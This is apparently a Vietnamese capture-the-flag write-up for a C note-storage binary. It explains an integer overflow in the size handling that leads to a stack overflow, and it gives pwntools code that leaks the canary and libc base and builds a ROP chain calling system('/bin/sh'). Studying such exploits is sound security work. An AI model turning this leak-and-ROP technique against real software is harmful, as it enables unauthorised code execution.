- Bài này code c thường nên mình sẽ đi thẳng vào bug luôn, đầu tiên ta sẽ thấy được `interger overflow` tại hàm `add_cred`:

- ```c
  unsigned __int64 __fastcall add_cred(int idx)
  {
    __int64 size; // [rsp+10h] [rbp-30h] BYREF
    ssize_t v3; // [rsp+18h] [rbp-28h]
    unsigned __int64 v4; // [rsp+28h] [rbp-18h]
  
    v4 = __readfsqword(0x28u);
    memset(&size, 0, 0x18uLL);
    set_canary((__int64)&size, 24LL);
    if ( note_size[idx] )
    {
      puts("Note exist!");
    }
    else
    {
      printf("Size: ");
      __isoc99_scanf("%lu", &size);
      getchar();
      *(_QWORD *)&note_size[idx] = size;
      if ( note_size[idx] > 0 && note_size[idx] <= 256 )
      {
     ...................................
  ```

- Ta được nhập vào mội biến `size` bằng `%lu` ứng với 8 byte, nhưng `note_size` có kiểu dữ liệu là `int` tuy và nó lại gán `*(_QWORD *)&note_size[idx] = size;` điều này sẽ dẫn tới `note_size` sẽ tràn sang index kế tiếp. Tức `index+1` sẽ không được checksize.

- Tiếp theo là bug `overflow` và nó do bug trên gây ra, tại hàm `lock_n_lock` khi nó thực hiện xor và gán vào stack:

- ```c
  if ( a1 == -1 )
    {
      for ( i = 0; i <= 3; ++i )
      {
        if ( encrypted )
          printf("Encrypting credential %d...", (unsigned int)i);
        else
          printf("Decrypting credential %d...", (unsigned int)i);
        memset(s, 0, 0x100uLL);
        for ( j = 0; j < note_size[i]; ++j )
          s[j] = key[j % 8] ^ note[256 * (__int64)i + j];
        memcpy(&note[256 * (__int64)i], s, note_size[i]);
        puts("\t--> Done");
      }
      check_canary((__int64)s, 264LL);
    }
    else
    {
      for ( k = 0; k < note_size[a1]; ++k )
        s[k] = key[k % 8] ^ note[256 * (__int64)a1 + k];
      memcpy(&note[256 * (__int64)a1], s, note_size[a1]);
    }
  ```

- Do `note_size` lớn sẽ `overflow` được từ `s`. Hàm này sẽ được thực thi nếu `encrypted` bật thông qua `option 4`.

- Thêm một điều nữa, để tránh `canary custom` nó luôn đổi liên tục thì ta chỉ nên `overflow` với `a1!=-1` tức phép xor phía dưới,

- Đầu tiên ta sẽ `leak` nhiều thứ từ tính năng `edit` với `interger overflow`:

- ```c  
  unsigned __int64 __fastcall edit_cred(int a1)
  {
    size_t v1; // rax
    int v2; // eax
    int idx; // [rsp+Ch] [rbp-134h]
    char s[256]; // [rsp+10h] [rbp-130h] BYREF
    char yn[8]; // [rsp+110h] [rbp-30h] BYREF
    ssize_t v7; // [rsp+118h] [rbp-28h]
    unsigned __int64 v8; // [rsp+128h] [rbp-18h]
  
    idx = a1;
    v8 = __readfsqword(0x28u);
    memset(s, 0, 0x118uLL);
    set_canary((__int64)s, 280LL);
    if ( note_size[a1] )
    {
      if ( encrypted )
      {
        printf("Decrypting credential...");
        lock_n_lock(idx);
        puts("\t--> Done");
      }
      printf("Old data: %s\n", &note[256 * (__int64)idx]);
      printf("New data: ");
      v7 = read(0, s, 0x100uLL);
      if ( s[v7 - 1] == 10 )
        s[v7 - 1] = 0;
      printf("Save note? [y/n]: ");
      __isoc99_scanf("%c", yn);
      getchar();
      if ( yn[0] == 121 )
      {
        v1 = strlen(s);
        if ( v1 > note_size[idx] )
        {
          v2 = strlen(s);
          note_size[idx] = v2;
        }
        memcpy(&note[256 * (__int64)idx], s, note_size[idx]);
  	...............................................
  }
  ```

- `memcpy` với `size` lớn sẽ lấy nhiều từ `stack` đưa vào `note`, sau đó ta chỉ việc in nó ra

- ```py
  add_cred(0, 0x00001ff00000000)
  edit_cred(1, b'a'*256)
  add_cred(2, 0x19, b'a'*0x14 + b'abcd' + b'e', 1)
  canary = u64(edit_cred(2, b'a'*0x84 + b'abcd').split(b'abcd')[1][0:8]) - ord('e')
  print('canary: ' + hex(canary))
  
  libc.address = u64(edit_cred(2, b'a'*0x84 + b'abcd').split(b'abcd')[1] + b'\x00'*2) - 0x23a90
  print('libc_base: ' + hex(libc.address))
  
  delete(1)
  delete(2)
  ```

- Sau khi có `libc` thì mình thực hiện bật `option 4` lên và thực hiện `overflow`:

- ```py
  en_de()
  pop_rdi = 0x00000000000240e5 + libc.address
  payload = flat(
      b'a'*0x8,
      canary, 0,
      pop_rdi,
      next(libc.search(b'/bin/sh')),
      pop_rdi+1,
      libc.sym['system']
  )
  add_cred(2, len(payload), payload, 1)
  add_cred(0, 0x000001ff00000000)
  sln(b'> ', 2)
  sln(b'Index: ', 1)
  ```